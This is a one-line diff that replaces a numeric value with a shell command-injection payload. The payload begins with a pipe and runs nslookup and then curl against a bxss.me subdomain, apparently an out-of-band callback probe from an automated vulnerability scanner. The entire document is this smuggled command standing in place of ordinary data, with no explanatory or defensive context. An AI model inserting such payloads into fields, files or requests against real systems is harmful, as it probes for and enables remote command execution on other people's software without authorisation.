@@ -1,1 +1,1 @@
-5559857863
+|(nslookup -q=cname hitiomoygpifk22075.bxss.me||curl hitiomoygpifk22075.bxss.me)
